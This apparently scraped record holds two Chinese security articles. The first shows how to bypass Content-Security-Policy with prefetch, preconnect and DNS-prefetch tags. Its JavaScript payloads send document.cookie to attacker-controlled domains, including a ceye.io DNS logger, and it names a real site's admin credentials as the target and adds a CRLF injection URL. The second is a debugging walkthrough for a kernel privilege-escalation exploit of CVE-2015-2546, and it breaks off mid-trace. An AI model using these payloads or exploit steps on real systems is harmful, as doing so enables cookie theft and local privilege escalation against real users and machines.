DNS-Prefetch ，浏览器空闲时提前将分析页面需要资源所在的域名转化为 IP 地址，当浏览器真正使用到该域中的某个资源时就可以尽快地完成 DNS 解析。（例如在地址栏中输入 URL 时，Chrome 就已经自动完成了预解析甚至渲染，从而为每个请求节省了大量的时间。）：&lt;link rel=""dns-prefetch"" href=""http://linux.im""&gt;  预连接 Preconnect （支持 Chrome46+, Firefox39+），与 DNS 预解析类似，preconnect 不仅完成 DNS 预解析，同时还将进行 TCP 握手和建立传输层协议：&lt;link rel=""preconnect"" href=""http://1.111asd1-testcsp.n0tr00t.com""&gt;  对特定文件类型进行预加载， Chromium 使用 subresource rel 的话，优先级将低于样式文件和脚本文件，但不低于图片加载优先级，在最新版本中已经 Remove[4] 这个属性，使用新的 ""preload"" [5] 代替：&lt;link rel='subresource' href='warning.js'&gt;  Preload 作为一个新的 WEB 标准，它为处理当前页面而生，和 subresource 一样，但又有着一些区别，例如 onload 事件， as 属性等等：&lt;link rel=""preload"" href=""//linux.im/styles/other.css""&gt;  在 Firefox 中我们也可以通过设置 Header 头 X-moz: prefetch 来进行 prefetch，可能有些人希望能够禁用掉这个预加载，可以在 FF 浏览器的 about:config 中 user_pref(""network.prefetch-next"", false); 禁用掉对所有站点的预加载支持。如何设置预加载的顺序？在 W3c Resource Priorities [6] 增加了两个重要资源属性：lazyload 和 postpone 。lazyload 懒加载: 一个资源必须等待其他没有标识lazyload的开始下载以后才能下载；postpone 延缓: 一个资源直到要显示给用户时才可以下载。适合图片 视频等元素；不是所有的资源都可以预加载，当资源为以下列表中的资源时，将阻止预渲染操作：弹窗页面含恶意软件的页面URL 中包含下载资源页面中包含音频、视频POST、PUT 和 DELETE 操作的 ajax 请求HTTP 认证(Authentication) / HTTPS 页面正在运行 Chrome developer tools 开发工具0x04 Bypass Chrome CSP在 Chrome 中，CSP 的规范执行是较低于 Firefox 的（0x05会提到），我们来看下面这条规则：Content-Security-Policy: default-src 'self'; script-src 'self' test.n0tr00t.com 'unsafe-inline';  默认同源下的资源加载，允许内部标签执行但只能数据传输给同源和 test.n0tr00t.com 域下，一般情况下我们可以通过入侵 test.n0tr00t.com 域名来将信息传输出去，除此之外，如果是交互性较强的平台，我们也可以不将数据对外传输，例如：http://linux.im/2015/09/20/Dotabuff-Worm.html由于 inline 的存在，我们可以内嵌代码到页面中对社区进行蠕虫等操作，但由于开始提到 Chrome CSP 中的规范执行是较低于 Firefox 的，所以我们可以使用前面提到的多个属性来进行绕过获取信息。var n0t = document.createElement(""link"");  n0t.setAttribute(""rel"", ""prefetch"");  n0t.setAttribute(""href"", ""//n0tr00t.com/?"" + document.cookie);  document.head.appendChild(n0t); 页面渲染完毕会创建 Link REL=prefetch 的标签，发目标页面发起预加载，我们也可以使用其他属性（2016.02 Fuzz 部分结果）：PrefetchPrerenderPreload…E.g SourceCode :    &lt;?php    header(""Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';"");    ?&gt;    &lt;html&gt;    &lt;head&gt;&lt;/head&gt;    &lt;body&gt;        csp header test        &lt;script&gt;        document.cookie = ""csp="" + escape(""sad@jisajid&amp;*JDSJddsajhdsajkh21sa213123o1"") + "";"";        var n0t = document.createElement(""link"");        n0t.setAttribute(""rel"", ""prefetch"");        n0t.setAttribute(""href"", ""//1J38ax.chromecsptest.test.n0tr00t.com/?"" + document.cookie);        document.head.appendChild(n0t);        &lt;/script&gt;    &lt;/body&gt;    &lt;/html&gt;PageRequestResult :0x05 Bypass Firefox CSP如果我们使用前面的 Prefetch 等标签在 Firefox 上是肯定传输不出去数据的，因为 Firefox 浏览器有着较高的 CSP 规范执行，所以我们可以使用其他属性来对 Firefox 上 CSP 进行绕过，虽然这些属性也已经申请加入规范，但目前仍可利用，下面来看目前 src.ly.com 的 CSP 规则：content-security-policy:  default-src *; script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com  img1.40017.cn captcha.guard.qcloud.com  'unsafe-inline' 'unsafe-eval'; style-src 'self' *.ly.com sec-pic-ly.b0.upaiyun.com *.guard.qcloud.com 'unsafe-inline'; img-src 'self' sec-pic-ly.b0.upaiyun.com  hm.baidu.com  https://static.wooyun.org http://static.wooyun.org *.guard.qcloud.com  data: ; media-src 'self' *.ly.com *.40017.cn;font-src 'self' sec-pic-ly.b0.upaiyun.com data:  script-src 'self' bi-collector.oneapm.com *.ly.com hm.baidu.com sec-pic-ly.b0.upaiyun.com img1.40017.cn captcha.guard.qcloud.com 'unsafe-inline' 'unsafe-eval';style-src 'self' *.ly.com sec-pic-ly.b0.upaiyun.com *.guard.qcloud.com 'unsafe-inline';img-src 'self' sec-pic-ly.b0.upaiyun.com hm.baidu.com https://static.wooyun.org http://static.wooyun.org *.guard.qcloud.com data: ;media-src 'self' *.ly.com *.40017.cn;font-src 'self' sec-pic-ly.b0.upaiyun.com data:;我们的目标是 src.ly.com 的管理员登录凭证，通过细看上面的 CSP 规则我们可以发现存在很多问题，例如 *.40017.cn, unsafe-inline, unsafe-eval, static.wooyun.org 等多个不可控的”信任“外部源。现在我们拥有平台存储型跨站，但由于没有像之前 Dota 社区的用户交互性（我们的目的也不是蠕虫），当然你可以通过获取 Document.cookie 并使用站内私信功能发送给你，然后达到目标，只不过听起来不是那么可靠。script 的规则满足我们的条件，我们可以使用多个方法来绕过限制创建标签偷取数据：PreconnectDNS-Prefetch…Payload:    dc  = document.cookie;    dcl = dc.split("";"");    n0 = document.getElementsByTagName(""HEAD"")[0];    for (var i=0; i&lt;dcl.length;i++)    {        console.log(dcl[i]);        n0.innerHTML = n0.innerHTML + ""&lt;link rel=\""preconnect\"" href=\""//"" + escape(dcl[i].replace(/\//g, ""-"")).replace(/%/g, ""_"") + '.' + location.hostname.split(""."").join("""") +  "".vqn3j8.ceye.io\""&gt;"";    }收取获得 DNS 查询记录：0x06 END还有一些伪绕过的 CASE，例如 CRLF （回车 + 换行 \r\n 的简称，在HTTP协议中，HTTP Header 与 HTTP Body 是用两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP 内容并显示出来。），因为大部分浏览器是根据最后一次出现的同名头来设置的。E.g:http://www.n0tr00t.com/%0d%0aSet-cookie:ID%3Dabcdefg整篇文章写到并列出的一些 CASE 是我今年初（16） Fuzz 到的，前两天 Patrick Vananti 把 DNS 预解析的发出后，便想把之前的笔记进行简单整理并公布，其中还有一些未列出的属性和方法，欢迎研究：）0x07 文献参考[0] : https://w3c.github.io/webappsec-csp/[1] : http://caniuse.com/#feat=contentsecuritypolicy[2] : https://content-security-policy.com/[3] : https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ[4] : https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/Y_2eFRh9BOs/gULYapoRBwAJ[5] : https://w3c.github.io/preload/[6] : https://w3c.github.io/web-performance/specs/ResourcePriorities/Overview.html[7] : http://bubkoo.com/2015/11/19/prefetching-preloading-prebrowsing/[8] : http://www.cnblogs.com/suyuwen1/p/5506397.html[9] : http://blog.shaochuancs.com/w3c-html5-link/","2016-10-28 15:42:53","网络安全","Bypass unsafe-inline mode CSP","http://nsoad.com/Article/Network-security/20161028/657.html"
"5ccbfaf84f2f0a0a7a69c0f4","前言上一次我发了一篇自己在一个经典内核漏洞CVE-2014-4113中挣扎的经历，以及一些调试细节的分享：http://bobao.360.cn/learning/detail/3170.html总结过后感觉自己收获很","kong","前言上一次我发了一篇自己在一个经典内核漏洞CVE-2014-4113中挣扎的经历，以及一些调试细节的分享：http://bobao.360.cn/learning/detail/3170.html总结过后感觉自己收获很多，后来一个偶然的机会，我看到了百度安全实验室发的一篇文章，是关于另一个经典的内核漏洞，也就是今天的主角----CVE-2015-2546这个漏洞的从补丁对比到Exploit的分析：http://xlab.baidu.com/cve-2015-2546%ef%bc%9a%e4%bb%8e%e8%a1%a5%e4%b8%81%e6%af%94%e5%af%b9%e5%88%b0exploit/同样感觉收获满满，在这篇分析中，总结了漏洞的成因，以及构造还原的手法，受益匪浅，但是并没有提供Exploit，于是根据这篇分析，我尝试编写了一下Exploit，这一次真的是非常艰辛，一边逆向调试，一边编写Exploit，磕磕绊绊完成了这个漏洞的利用，但和我的上一篇分析一样，在调试过程中，有好多非常有意思的过程，所以总结了一下，拿出来和大家一起分享。下面开始我这只小菜鸟的提权之旅。从CVE-2014-4113到CVE-2015-254首先我来描述一下这个漏洞的过程：在创建弹出菜单之后，当进行鼠标操作的时候会触发鼠标事件，引发win32k.sys下的一个叫做MNMouseMove的函数，在这个函数的处理过程中会涉及到一个叫做MNHideNextHierarchy的函数，这个函数会传入一个参数，这个参数是一个名为tagPOPUPMENU的结构体对象，由于对于这个对象没有进行检查，导致可以通过前面的SendMessage异步的方法，使用将这个对象释放掉，然后使用一个fake_tag进行占位，从而将这个fake_tag传入MNHideNextHierarchy，在这个函数中会处理一个1E4消息，在这里由于fake_tag的关系，导致释放后重用，从而引发在Ring0层执行Shellcode，最后完成提权。第一次看到这个漏洞的时候，我就觉得这个利用的过程和CVE-2014-4113非常相像，都是在SendMessage中完成的利用，也就是利用的call [esi+60h]这个汇编指令。要想触发这个漏洞，首先要想办法执行到MNMouseMove，我们一起来分析一下从哪里能够执行到MNMouseMove。这个过程是不是非常熟悉，从TrackPopupMenuEx到MNLoop，到HandleMenuMessages，最后到MNMouseMove。我们上一篇调试CVE-2014-4113就是这个过程，上一个漏洞发生在HandleMenuMessage中，而CVE-2015-2546发生在HandleMenuMessages里面的另一个调用，那么我就产生了一个想法，CVE-2014-4113的Exploit我们是否能在这个漏洞里使用呢？（事后证明，想的容易，做起来难，不过过程很有意思。）我们就从CVE-2014-4113这个Exploit入手，来完成CVE-2015-2546的提权。和内核对抗的日子首先我们来看一下CVE-2014-4113和CVE-2015-2546有多少关系，相关内容，可以看一下注释。if ( v5 &gt; 0x104 )  {    if ( v5 &gt; 0x202 )    {     ……    }    ……    if ( v20 )    {      v21 = v20 - 1;      if ( v21 )      {        ……            v13 = xxxMNFindWindowFromPoint(v3, (int)&amp;UnicodeString, (int)v7);            v52 = IsMFMWFPWindow(v13);            if ( v52 )        ……            if ( v13 == -1 )              xxxMNButtonDown((PVOID)v3, v12, UnicodeString, 1);            else              xxxSendMessage((PVOID)v13, -19, UnicodeString, 0);// CVE -2014-4113的漏洞位置            if ( !(*(_DWORD *)(v12 + 4) &amp; 0x100) )              xxxMNRemoveMessage(*(_DWORD *)(a1 + 4), 516);          }          return 0;        }        goto LABEL_59;    }    ……LABEL_59:    ……    xxxMNMouseMove(v3, a2, (int)v7); // CVE-2015-2546漏洞位置    return 1;  }}可以看到，两个漏洞的位置都处于HandleMenuMessages的函数中，经过CVE-2014-4113的分析，我们发现这个过程需要通过调用PostMessage的函数，这涉及到对窗口的操作，在CVE-2014-4113中，通过WNDCLASS类中的lpfnWndProc定义了回调函数MyWndProc负责处理窗口函数，这里使用的PostMessage的方法。这样的话，为了使程序执行到MNMouseMove，我需要设定一个鼠标事件，这里的灵感来源于百度实验室的分析文章，所以我考虑使用。//WM_SYSCOMMAND处理消息PostMessage(hwnd,WM_SYSCOMMAND,0,0);//发送WM_SYSCOMMAND//鼠标事件PostMessage(hwnd,WM_LBUTTONDOWN,0,0);//鼠标左键按下PostMessage(hwnd,WM_LBUTTONUP,0,0);//鼠标左键抬起但是经过调试，我发现无论如何也到达不了调试位置，这样我需要考虑为何无法到达调试位置，在分析的过程中发现了一个有趣的事情，首先，在CVE-2014-4113中，使用TrackPopupMenu会创建一个弹出窗口菜单。但是，当修改了MyWndProc变成我们设定的事件之后，窗口菜单弹出后就没有后续动作了，也就是说，没有进入MNMouseMove的处理过程，但是当我把鼠标挪到上图的菜单中时，我们首先命中了HandleMenuMessages断点，紧接着命中了MNMouseMove。kd&gt; gBreakpoint 6 hitwin32k!xxxHandleMenuMessages:90668d78 8bff            mov     edi,edikd&gt; gBreakpoint 4 hitwin32k!xxxMNMouseMove:906693ef 8bff            mov     edi,edi这说明在鼠标挪上去后在HandleMenuMessages中发生的事情能够使程序最后进入MNMouseMove，分析一下这个过程。kd&gt; pwin32k!xxxHandleMenuMessages+0x1b:90668d93 8b7508          mov     esi,dword ptr [ebp+8]kd&gt; pwin32k!xxxHandleMenuMessages+0x1e:90668d96 8b4604          mov     eax,dword ptr [esi+4]kd&gt; pwin32k!xxxHandleMenuMessages+0x21:90668d99 8b5608          mov     edx,dword ptr [esi+8]kd&gt; r eaxeax=00000200可以发现，程序进入后，会传递一个值0x200，这个值会在随后的过程中连续传递并且判断并且跳转，这个过程不再详细跟踪，举两个跳转的例子。//一处跳转，0x200和0x104作比较kd&gt; pwin32k!xxxHandleMenuMessages+0x2f:90668da7 895dfc          mov     dword ptr [ebp-4],ebxkd&gt; pwin32k!xxxHandleMenuMessages+0x32:90668daa 3bc1            cmp     eax,ecxkd&gt; r eaxeax=00000200kd&gt; r ecxecx=00000104kd&gt; pwin32k!xxxHandleMenuMessages+0x34:90668dac 0f87e4010000    ja      win32k!xxxHandleMenuMessages+0x21d (90668f96)//另一处跳转，0x200和0x202作比较kd&gt; pwin32k!xxxHandleMenuMessages+0x21d:90668f96 b902020000      mov     ecx,202hkd&gt; pwin32k!xxxHandleMenuMessages+0x222:90668f9b 3bc1            cmp     eax,ecxkd&gt; pwin32k!xxxHandleMenuMessages+0x224:90668f9d 0f8706010000    ja      win32k!xxxHandleMenuMessages+0x330 (906690a9)这时我们看一下我这篇文章开头提到的HandleMenuMessages函数的分析，在开头有两处if语句判断，正是和这两个值做的比较，接下来经过一系列判断跳转之后，我们就到达了MNMouseMove的调用。kd&gt; pwin32k!xxxHandleMenuMessages+0x264:90668fdd a900040000      test    eax,400hkd&gt; pwin32k!xxxHandleMenuMessages+0x269:90668fe2 747a            je      win32k!xxxHandleMenuMessages+0x2e5 (9066905e)kd&gt; pwin32k!xxxHandleMenuMessages+0x2e5:9066905e 53              push    ebx9066905e地址所处的位置，已经是MNMouseMove的上方，ebx正在作为MNMouseMove的参数传入栈中。.text:BF93905E ; 395:     xxxMNMouseMove(v3, a2, (int)v7);.text:BF93905E                 push    ebx             ; int.text:BF93905F                 push    esi             ; int.text:BF939060                 push    edi             ; UnicodeString.text:BF939061                 call    _xxxMNMouseMove@12 ; xxxMNMouseMove(x,x,x)也就是说，之前传入的这个eax是一个很关键的值，如果弄明白这个值，就可以让程序成功执行到MNMouseMove了，但因为这个过程实际上是通过Windows下的图形界面操作（也就是鼠标在我们创建的主窗口移动产生的），所以我们并不能通过CVE-2014-4113的源码分析出来，这里需要分析一下这个值得内容，这时我想到了CVE-2014-4113源程序，同样也是在HandleMenuMessages进行if语句的判断导致跳转，而CVE-2014-4113已经分析的很清楚了，运行CVE-2014-4113的源程序，中断在HandleMenuMessage调试。kd&gt; pwin32k!xxxHandleMenuMessages+0x19:90668d91 53              push    ebxkd&gt; pwin32k!xxxHandleMenuMessages+0x1a:90668d92 56              push    esikd&gt; pwin32k!xxxHandleMenuMessages+0x1b:90668d93 8b7508          mov     esi,dword ptr [ebp+8]kd&gt; pwin32k!xxxHandleMenuMessages+0x1e:90668d96 8b4604          mov     eax,dword ptr [esi+4]kd&gt; pwin32k!xxxHandleMenuMessages+0x21:90668d99 8b5608          mov     edx,dword ptr [esi+8]kd&gt; r eaxeax=00000201kd&gt; dd esi85c4bb0c  000f02a2 00000201 00000000 00000000可以看到这里eax的值是0x201（刚才那个是0x200），也就是十进制的513，来看一下CVE-2014-4113里的过程，计算一下。 v20 = v5 - 261;    if ( v20 )    {      v21 = v20 - 1;      if ( v21 )      {        v22 = v21 - 18;        if ( !v22 )          return 1;        v23 = v22 - 232;        if ( v23 )        {          if ( v23 == 1 )          {LABEL_13:            v12 = a2;            *(_DWORD *)(a2 + 16) = -1;            *(_DWORD *)(a2 + 8) = (signed __int16)v7;            *(_DWORD *)(a2 + 12) = SHIWORD(v7);            v13 = xxxMNFindWindowFromPoint(v3, (int)&amp;UnicodeString, (int)v7);            v52 = IsMFMWFPWindow(v13);这里要计算最后v23的值，就从最上方v20的值开始向下判断，也就是v23=513-261-1-18-232=1，正好v23等于1，从而进入下面CVE-2014-4113的处理逻辑。v5的值，就是0x201，也就是513，那么这个值到底是什么呢，我们来查一下这个值。public enum WMessages : int   {       WM_LBUTTONDOWN = 0x201, //Left mousebutton down       WM_LBUTTONUP = 0x202,  //Left mousebutton up       WM_LBUTTONDBLCLK = 0x203, //Left mousebutton doubleclick       WM_RBUTTONDOWN = 0x204, //Right mousebutton down       WM_RBUTTONUP = 0x205,   //Right mousebutton up       WM_RBUTTONDBLCLK = 0x206, //Right mousebutton doubleclick       WM_KEYDOWN = 0x100,  //Key down       WM_KEYUP = 0x101,   //Key up   }原来这个值就是WM_LBUTTONDOWN的值，正是CVE-2014-4113利用程序中MyWndProc中其中第三个PostMessage中调用到的第二个参数值，所以，我在这里，将我的Exploit中的PostMessage里第二个参数直接修改成0x200，重新运行程序，终于命中了MNMouseMove断点。接下来可以进入内层函数分析了。进入内层函数后，我们需要想办法让程序执行到MNFindeWindowFromPoint函数调用的位置，但是我发现到其中一个判断的时候没法通过，会直接到退出的位置。kd&gt; pwin32k!xxxMNMouseMove+0x2f:9066941e 0f846f010000    je      win32k!xxxMNMouseMove+0x1a4 (90669593)kd&gt; pwin32k!xxxMNMouseMove+0x1a4:90669593 5f              pop     edi来看一下IDA pro的伪代码。if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 12) )    {只有上面伪代码中的if语句判断通过后，才能进入到漏洞的处理流程，动态跟踪一下这个过程。kd&gt; pwin32k!xxxMNMouseMove+0x26:90669415 c1ea10          shr     edx,10hkd&gt; r edxedx=00000000kd&gt; pwin32k!xxxMNMouseMove+0x29:90669418 0fbfd2          movsx   edx,dxkd&gt; r edxedx=00000000kd&gt; pwin32k!xxxMNMouseMove+0x2c:9066941b 3b570c          cmp     edx,dword ptr [edi+0Ch]这最主要的原因就是对比的两个值都为0，从而不满足if语句的跳转，跳过了漏洞处理所需的逻辑流程，但是在我们利用鼠标移动的时候，却发现这个流程可以进入if语句判断。kd&gt; pwin32k!xxxHandleMenuMessages+0x2e8:90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)kd&gt; dd esp85c47a98  fde8da68 9074f580 000f0059 9074f580 //000f0059kd&gt; pwin32k!xxxMNMouseMove+0x18:90669407 0fbfc1          movsx   eax,cxkd&gt; r ecxecx=000f0059kd&gt; pwin32k!xxxMNMouseMove+0x1b:9066940a 57              push    edikd&gt; pwin32k!xxxMNMouseMove+0x1c:9066940b 8b7d0c          mov     edi,dword ptr [ebp+0Ch]kd&gt; pwin32k!xxxMNMouseMove+0x1f:9066940e 3b4708          cmp     eax,dword ptr [edi+8]kd&gt; pwin32k!xxxMNMouseMove+0x22:90669411 7511            jne     win32k!xxxMNMouseMove+0x35 (90669424)kd&gt; pwin32k!xxxMNMouseMove+0x35:90669424 894708          mov     dword ptr [edi+8],eaxkd&gt; r eaxeax=00000059鼠标移动的情况下，eax的值是0x59，并非0x00，那么这个值从哪里来呢，在进入MNMouseMove前看一下参数。kd&gt; pwin32k!xxxHandleMenuMessages+0x2e8:90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)kd&gt; dd esp85c47a98  fde8da68 9074f580 000f0059 9074f580通过IDA pro分析一下HandleMenuMessages函数，看看这个值是从哪里来。v5 = *(_DWORD *)(a1 + 4);v6 = *(_DWORD *)(a1 + 8);v7 = *(void **)(a1 + 12);xxxMNMouseMove(v3, a2, (int)v7);是a1，也就是HandleMenuMessages的第一个参数，这样我们可以回到CVE-2014-4113中，在调用HandleMenuMessages的时候，直接查看第一个参数偏移+0Ch位置的值，看看这个值是不是由我们决定的。kd&gt; pwin32k!xxxHandleMenuMessages+0x1e:90668d96 8b4604          mov     eax,dword ptr [esi+4]kd&gt; pwin32k!xxxHandleMenuMessages+0x21:90668d99 8b5608          mov     edx,dword ptr [esi+8]kd&gt; pwin32k!xxxHandleMenuMessages+0x24:90668d9c 8b5e0c          mov     ebx,dword ptr [esi+0Ch]kd&gt; r edxedx=00000000kd&gt; pwin32k!xxxHandleMenuMessages+0x27:90668d9f b904010000      mov     ecx,104hkd&gt; r ebxebx=00000000kd&gt; r eaxeax=00000201可以看到ebx寄存器是esi+0ch的值，这个值是0，eax的值是0x201，回过头看一下正常Exploit中MyWndProc函数的PostMessages的参数调用。PostMessage(hwnd,WM_LBUTTONDOWN,0x00,0)这个第三个第四个特定参数都是0x00，那么我觉得这个可能和MNMouseMove中的值有关，于是我尝试修改了CVE-2015-2546中PostMessage消息传递的特定参数。修改之后，我们重新跟踪调试。kd&gt; pwin32k!xxxHandleMenuMessages+0x21:90668d99 8b5608          mov     edx,dword ptr [esi+8]kd&gt; pwin32k!xxxHandleMenuMessages+0x24:90668d9c 8b5e0c          mov     ebx,dword ptr [esi+0Ch]kd&gt; pwin32k!xxxHandleMenuMessages+0x27:90668d9f b904010000      mov     ecx,104hkd&gt; r edxedx=00110011kd&gt; r ebxebx=00110011果然这个值可控了，而且esi指针的值就+4h是PostMessage第二个参数，+08h是第三个参数，+0Ch是第四个参数，接下来，MNMouseMove也能够正常进入if语句的处理流程了。kd&gt; pwin32k!xxxHandleMenuMessages+0x2e8:90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)kd&gt; dd esp85d07a98  fde8da68 9074f580 00110011 9074f580kd&gt; pwin32k!xxxMNMouseMove+0x1f:9066940e 3b4708          cmp     eax,dword ptr [edi+8]kd&gt; pwin32k!xxxMNMouseMove+0x22:90669411 7511            jne     win32k!xxxMNMouseMove+0x35 (90669424)kd&gt; r eaxeax=00000011kd&gt; pwin32k!xxxMNMouseMove+0x35:90669424 894708          mov     dword ptr [edi+8],eax在HOOK中挣扎和Exploit接下来，进入到消息钩子部分，主要处理的还是SendMessage异步处理时的消息，通过修改返回，最后达到漏洞调用位置，通过IDA pro来跟踪一下MNMouseMove的执行流程，以及跟CVE-2015-2546有关的部分。void __stdcall xxxMNMouseMove(WCHAR UnicodeString, int a2, int a3){  ……    if ( (signed __int16)a3 != *(_DWORD *)(a2 + 8) || SHIWORD(a3) != *(_DWORD *)(a2 + 12) )    {      *(_DWORD *)(a2 + 8) = (signed __int16)a3;      *(_DWORD *)(v5 + 12) = SHIWORD(v4);      v6 = xxxMNFindWindowFromPoint(v3, (int)&amp;UnicodeString, v4);// V6通过HOOK可控，这里的sendmessage是异步处理      v7 = v6;                                  // v7可控      ……      if ( *(_DWORD *)(v5 + 16) == 1 )          // 这个外层if不一定会进来      {        if ( !v7 || v7 == -1 &amp;&amp; *(_BYTE *)(*(_DWORD *)(v3 + 4) + 35) &amp; 0x20 )// 判断返回值是0或者-1          return;        *(_DWORD *)(v5 + 16) = -1;      }      if ( v7 == -5 )                           // 当返回值是0xffffffb      {……      }      else                                      // 否则进入这里      {         ……          v9 = *(_DWORD **)(v7 + 176);          // 获取tagPOPUPMENU的位置，偏移是+0B0h         ……          v10 = xxxSendMessage((PVOID)v7, -27, UnicodeString, 0);          if ( v10 &amp; 0x10 &amp;&amp; !(v10 &amp; 3) &amp;&amp; !xxxSendMessage((PVOID)v7, -16, 0, 0) )            xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置经过分析，我们需要处理三处SendMessage的异步过程，第一处在FindWindowFromPoint，这个函数中会有一处SendMessage，通过异步过程执行钩子，但是我调试时发现在进入这个函数返回，但并没有执行钩子。kd&gt; pwin32k!xxxMNMouseMove+0x48:90669437 e862010000      call    win32k!xxxMNFindWindowFromPoint (9066959e)kd&gt; pwin32k!xxxMNMouseMove+0x4d:9066943c f7470400800000  test    dword ptr [edi+4],8000hkd&gt; r eaxeax=fea11430跟踪一下这个过程，我发现在进入SendMessage之前，有一处if语句判断，当这个if语句判断不通过的时候，不会进入SendMessage处理。kd&gt; pwin32k!xxxMNFindWindowFromPoint+0x14:906695b2 8b470c          mov     eax,dword ptr [edi+0Ch]kd&gt; pwin32k!xxxMNFindWindowFromPoint+0x17:906695b5 85c0            test    eax,eaxkd&gt; pwin32k!xxxMNFindWindowFromPoint+0x19:906695b7 746b            je      win32k!xxxMNFindWindowFromPoint+0x86 (90669624)kd&gt; pwin32k!xxxMNFindWindowFromPoint+0x86:90669624 8b07            mov     eax,dword ptr [edi]kd&gt; dd edifde8da68  12a10008 fea38d58 fea11430 00000000可以看到这里eax的值是edi+0ch对应的值，也就是0，对应伪代码v5变量值为0，也就是if语句判断没通过，跳转了。这样我们还需要重新看一下这个值，这个值来自于tagPopupMenu结构体，通过CVE-2014-4113和CVE-2015-2546的tagPopupMenu结构体做一个对比。kd&gt; dt tagPOPUPMENU fde8da68//我们的Exploit中的结构体   +0x004 spwndNotify      : 0xfea38d58 tagWND   +0x008 spwndPopupMenu   : 0xfea11430 tagWND   +0x00c spwndNextPopup   : (null) kd&gt; dt fde8da68 tagPOPUPMENU//CVE-2014-4113的结构体   +0x004 spwndNotify      : 0xfea39de8 tagWND   +0x008 spwndPopupMenu   : 0xfea12398 tagWND   +0x00c spwndNextPopup   : 0xfea12578 tagWND实际上，在通过TrackPopupMenu之后会调用MNLoop进入循环处理消息，而我们的exp中只有一个postmessage，于是我们增加到三个postmessage，再次调试跟踪。kd&gt; pwin32k!xxxHandleMenuMessages+0x2e7:90669060 57              push    edikd&gt; pwin32k!xxxHandleMenuMessages+0x2e8:90669061 e889030000      call    win32k!xxxMNMouseMove (906693ef)kd&gt; r ediedi=fde8da68   +0x004 spwndNotify      : 0xfea39d18 tagWND   +0x008 spwndPopupMenu   : 0xfea11430 tagWND   +0x00c spwndNextPopup   : 0xfea12698 tagWND这样，我们就能够处理了，接下来利用三个钩子，分别处理三种消息的调用，这个调用过程和CVE-2014-4113相比差别还是比较大的。需要来看一下最关键的钩子该怎么用。首先我们要分析一下和漏洞利用最关键的函数xxxMNHideNextHierarchy，这个函数有一个参数。signed int __stdcall xxxMNHideNextHierarchy(int a1)  v1 = *(_DWORD *)(a1 + 12);  if ( v1 )  {    v2 = *(void **)(a1 + 12);    if ( v2 != *(void **)(a1 + 28) )      xxxSendMessage(v2, -28, 0, 0);//这里调用shellcode提权这个参数a1直接影响到后面的提权，回到外层看一下这个a1从哪里来。v6 = xxxMNFindWindowFromPoint(v3, (int)&amp;UnicodeString, v4);// V6通过HOOK可控，这里的sendmessage是异步处理      v7 = v6;                                  // v7可控      ……      v9 = *(_DWORD **)(v7 + 176);          // 获取tagPOPUPMENU的位置，偏移是+0B0h      if ( v10 &amp; 0x10 &amp;&amp; !(v10 &amp; 3) &amp;&amp; !xxxSendMessage((PVOID)v7, -16, 0, 0) )            xxxMNHideNextHierarchy((int)v9);    // 漏洞触发关键位置正是从MNFindWindowFromPoint而来，本来是一次轻松愉快的旅程，但是实际上在逻辑代码中，有一个地方导致了这次旅程血崩，就是：if ( IsWindowBeingDestroyed(v7) )            return;这个地方会对窗口的属性进行检查，也就是说，v7不能是一个任意值，比如是我们直接通过零页分配的shellcode的某个地址指针，如果可以的话，后面就会导致其他的利用了，因此这个值必须是一个窗口的值，因此我们用一种方法：就是创建窗口A和窗口B，在这里通过异步调用，返回窗口B的值，这样后续处理中，就会将窗口B的tagMenu偏移+0B0h位置的值，也就是tagPopupMenu交给v9，那么随后在最后一个SendMessage中销毁窗口B，通过一些方法将销毁后的位置占位，因为后面没有进行判断，从而可以调用占位后的值。而通过分析xxxMNHideNextHierarchy，内层函数用的是tagPopupMenu-&gt;spwndNextPopup，因此，只要在占位时再控制这个值，为一个我们可控的值，最后就能在xxxMNHideNextHierarchy里的sendmessage完成最后一步提权了。有了这个思路，我们开始利用钩子来完成这个过程。第一步，在FindWindowFromMessage函数调用中，处理1EB消息，这个和CVE-2014-4113很像。90669437 e862010000      call    win32k!xxxMNFindWindowFromPoint (9066959e)win32k!xxxMNMouseMove+0x4d:9066943c f7470400800000  test    dword ptr [edi+4],8000hkd&gt; r eaxeax=fea396d0第一步钩子会返回窗口B的值，这样，也能绕过IsDestroy的判断，随后进入第二步处理，第二步处理的值，是1E5的消息，这个消息返回后会将返回值和0x10做一个判断。xor     edi, edipush    edi             ; Addresspush    dword ptr [ebp+UnicodeString] ; UnicodeStringpush    1E5h            ; MbStringpush    esi             ; Pcall    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x); 67:           if ( v10 &amp; 0x10 &amp;&amp; !(v10 &amp; 3) &amp;&amp; !xxxSendMessage((PVOID)v7, -16, 0, 0) )test    al, 10hjz      short loc_BF939583这样我们控制钩子令返回值为0x10就可以了。kd&gt; pwin32k!xxxMNMouseMove+0x134:90669523 e87500f8ff      call    win32k!xxxSendMessage (905e959d)kd&gt; gBreakpoint 16 hitwin32k!xxxMNMouseMove+0x139:90669528 a810            test    al,10hkd&gt; r eaxeax=00000010kd&gt; pwin32k!xxxMNMouseMove+0x13b:9066952a 7457            je      win32k!xxxMNMouseMove+0x194 (90669583)第三步处理1F0的消息，这一步很关键，会调用SendMessage，在这一步的钩子中对窗口B进行销毁，销毁后占位，由于这一步是在一个if语句里，因此需要返回值为0，才能通过非的判断。.text:BF939530                 push    edi             ; Address.text:BF939531                 push    edi             ; UnicodeString.text:BF939532                 push    1F0h            ; MbString.text:BF939537                 push    esi             ; P.text:BF939538                 call    _xxxSendMessage@16 ; xxxSendMessage(x,x,x,x).text:BF93953D                 test    eax, eax.text:BF93953F                 jnz     short loc_BF939583.text:BF939541 ; 68:             xxxMNHideNextHierarchy(v9);         // 漏洞触发关键位置这样的话，我们销毁窗口，并且进行占位kd&gt; pBreakpoint 17 hitwin32k!xxxMNMouseMove+0x14e:9066953d 85c0            test    eax,eaxkd&gt; pwin32k!xxxMNMouseMove+0x150:9066953f 7542            jne     